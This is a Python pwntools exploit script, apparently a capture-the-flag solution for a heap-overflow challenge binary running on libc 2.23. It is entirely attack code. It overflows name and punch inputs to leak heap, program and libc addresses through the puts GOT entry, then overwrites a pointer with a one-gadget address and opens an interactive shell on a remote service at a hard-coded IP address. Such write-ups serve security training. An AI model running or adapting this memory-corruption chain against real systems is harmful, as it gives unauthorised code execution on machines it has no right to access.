# coding:utf-8

from pwn import *

LOCAL = False

elf = ELF("./opm_fu2jhuid901283yruhnuy892")
libc = ELF("../libc-2.23.so")
if LOCAL:
    context.log_level = 'debug'
    io = remote("10.211.55.9", 22333)
else:
    io = remote("39.107.33.43", 13572)

def mmenu(mchoice):
    io.recvuntil("(E)xit\n")
    io.sendline(mchoice)

def newrole(mname, punch):
    mmenu('A')
    io.recvuntil("Your name:\n")
    io.sendline(mname)
    io.recvuntil("N punch?\n")
    io.sendline(punch)

def show():
    mmenu('S')

def pwnit():
    newrole('a'*0x50, str(233))
    newrole('a'*0x80 + chr(0x30), str(233))
    newrole('a'*0x80, str(233).ljust(0x80,'c') + chr(0x30))
    io.recvuntil('<'+'a'*0x28)
    heap_addr = u64(io.recvuntil('>')[:-1].ljust(8, chr(0))) - 0x1A0
    log.success("heap address:"+hex(heap_addr))
    # leak bin address
    newrole('b'*0x30, str(heap_addr+0x170).ljust(0x80, 'b')+chr(0x20))
    newrole('b'*0x30, 'k'*0x80+chr(0x30))
    io.recvuntil("<")
    elf.address = u64(io.recvuntil(">")[:-1].ljust(8, chr(0))) - 0xB30
    log.info("bin base address:"+hex(elf.address))
    log.info("puts got address:"+hex(elf.got["puts"]))
    # leak libc
    newrole('b'*0x30, str(elf.got["puts"]).ljust(0x80, 'b')+chr(0x20))
    newrole('b'*0x30, 'k'*0x80+chr(0x30))
    io.recvuntil("<")
    libc.address = u64(io.recvuntil(">")[:-1].ljust(8, chr(0))) - libc.symbols["puts"]
    log.info("libc address:"+hex(libc.address))
    # pwnit
    newrole(p64(libc.address+0x4526a), str(heap_addr+0x420).ljust(0x80, 'b')+p64(heap_addr+0x420))
    show()
    io.interactive()

if __name__ == "__main__":
    pwnit()
    pause()



